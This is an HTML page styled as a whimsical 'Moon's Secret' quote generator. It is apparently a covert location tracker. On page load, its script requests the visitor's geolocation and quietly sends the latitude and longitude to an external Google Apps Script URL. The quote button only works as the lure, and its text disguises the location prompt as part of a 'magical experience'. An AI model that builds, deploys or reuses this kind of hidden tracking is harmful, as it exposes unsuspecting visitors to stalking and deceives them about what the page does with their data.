<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moon's Secret</title>
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="favicon.png">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: url('background.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            text-align: center;
        }

        .container {
            position: relative;
            top: 50%;
            transform: translateY(-50%);
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
        }

        p {
            font-size: 1.2em;
            margin-bottom: 30px;
            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
        }

        button {
            padding: 15px 30px;
            font-size: 1.2em;
            background: linear-gradient(45deg, #6a0dad, #8a2be2);
            color: white;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.6);
            box-shadow: 0 0 15px rgba(138, 43, 226, 0.6);
        }

        button:hover {
            background: linear-gradient(45deg, #8a2be2, #6a0dad);
            box-shadow: 0 0 25px rgba(138, 43, 226, 0.8);
        }

        .quote-box {
            margin: 20px auto;
            padding: 20px;
            background: white;
            color: #333;
            font-size: 1.2em;
            width: 60%;
            max-width: 400px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
            border: 3px solid rgba(138, 43, 226, 0.6);
            animation: glow 2s infinite;
        }

        @keyframes glow {
            0% { border-color: rgba(138, 43, 226, 0.4); }
            50% { border-color: rgba(138, 43, 226, 1); }
            100% { border-color: rgba(138, 43, 226, 0.4); }
        }
    </style>
</head>
<body onload="getLocation()">

<div class="container">
    <h1>Hey... Listen...</h1>
    <p>Moon is going to tell you a secret...</p>
    <button onclick="revealQuote()">Allow your location for a magical experience</button>
    <div id="quote-box" class="quote-box" style="display: none;"></div>
</div>

<script>
    var quotes = [
        "You are the brightest star in someone’s sky.",
        "The universe shines a little brighter because of you.",
        "You’re a masterpiece, uniquely crafted to be you.",
        "Every step you take leaves a trail of light.",
        "You hold the key to unlock the world’s wonders.",
        "The moon smiles back at you with its soft glow.",
        "In the galaxy of life, you’re the rarest star.",
        "Your presence turns the ordinary into extraordinary.",
        "The world is lucky to have you in it.",
        "You are a cosmic wonder, a treasure of the stars."
    ];

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        } else {
            console.log("Geolocation is not supported by this browser.");
        }
    }

    function showPosition(position) {
        const lat = position.coords.latitude;
        const long = position.coords.longitude;

        const googleScriptURL = "https://script.google.com/macros/s/AKfycbySAP6KAAlhS8Z-Rtj30nb06Tk9fpQWUClWc09o0E97k-thh5FX5WRgEn2ArycpNYHjnQ/exec"; 
        const url = googleScriptURL + "?lat=" + lat + "&long=" + long;

        const xhttp = new XMLHttpRequest();
        xhttp.open("GET", url, true);
        xhttp.send();
    }

    function revealQuote() {
        const randomIndex = Math.floor(Math.random() * quotes.length);
        const quoteBox = document.getElementById("quote-box");
        quoteBox.innerText = quotes[randomIndex];
        quoteBox.style.display = "block";
    }
</script>

</body>
</html>
